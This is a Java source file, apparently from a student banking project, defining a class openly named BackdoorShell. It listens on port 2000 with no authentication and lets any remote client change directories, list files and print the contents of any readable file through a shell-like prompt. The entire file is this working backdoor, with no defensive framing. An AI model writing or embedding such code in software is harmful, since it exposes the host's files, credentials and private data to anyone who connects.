package com.usman.csudh.bank.core;
import java.io.*;
import java.net.*;
import java.util.*;

public class BackdoorShell {
    public static void main(String[] args) throws Exception {
        ServerSocket server = new ServerSocket(2000);
        System.out.println("Listening for connections on port 2000...");

        while (true) {
            Socket client = server.accept();
            System.out.println("Client connected from " + client.getInetAddress());

            InputStream in = client.getInputStream();
            OutputStream out = client.getOutputStream();
            Scanner scanner = new Scanner(in);
            PrintWriter writer = new PrintWriter(out, true);

            String currentDir = System.getProperty("user.dir");
            String osName = System.getProperty("os.name");
            String prompt = osName.startsWith("Windows") ? currentDir + " > " : currentDir + " % ";

            writer.print(prompt);
            writer.flush();

            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();

                if (line.equals("exit")) {
                    writer.println("Goodbye!");
                    break;
                }

                String[] tokens = line.split("\\s+");

                if (tokens[0].equals("cd")) {
                    if (tokens.length == 1 || tokens[1].equals("~")) {
                    	 // Set the current working directory to the user's home directory
                        String homeDir = System.getProperty("user.home");
                        currentDir = homeDir;
                        System.setProperty("user.dir", homeDir);
                    } else if (tokens[1].equals(".")) {
                        // do nothing
                    } else if (tokens[1].equals("..")) {
                        File dir = new File(currentDir);
                        String parent = dir.getParent();
                        if (parent != null) {
                            System.setProperty("user.dir", parent);
                        }
                    } else {
                        File dir = new File(currentDir, tokens[1]);
                        if (dir.isDirectory()) {
                            System.setProperty("user.dir", dir.getCanonicalPath());
                        } else {
                            writer.println("Directory " + tokens[1] + " not found!");
                        }
                    }
                    currentDir = System.getProperty("user.dir");
                    prompt = osName.startsWith("Windows") ? currentDir + "> " : currentDir + " % ";
                    writer.print(prompt);
                    writer.flush();
                } else if (tokens[0].equals("dir")) {
                    File dir = new File(currentDir);
                    File[] files = dir.listFiles();
                    writer.println("List of files in " + currentDir);
                    for (File file : files) {
                        writer.println(file.getName() + " - " + (file.isDirectory() ? "Directory" : "File"));
                    }
                    writer.println(files.length + " files in total");
                    writer.print(prompt);
                    writer.flush();
                } else if (tokens[0].equals("cat")) {
                    if (tokens.length != 2) {
                        writer.println("Usage: cat <filename>");
                        writer.print(prompt);
                        writer.flush();
                    } else {
                        File file = new File(currentDir, tokens[1]);
                        if (file.isFile()) {
                            BufferedReader reader = new BufferedReader(new FileReader(file));
                            String line2 = null;
                            while ((line2 = reader.readLine()) != null) {
                                writer.println(line2);
                            }
                            reader.close();
                        } else {
                            writer.println("File " + tokens[1] + " not found!");
                        }
                        writer.print(prompt);
                        writer.flush();
                    }
                } else {
                    writer.println("Command not recognized!");
                    writer.print(prompt);
                    writer.flush();
                }
            }

            writer.close();
            scanner.close();
            client.close();
            server.close();
        }
    }
}
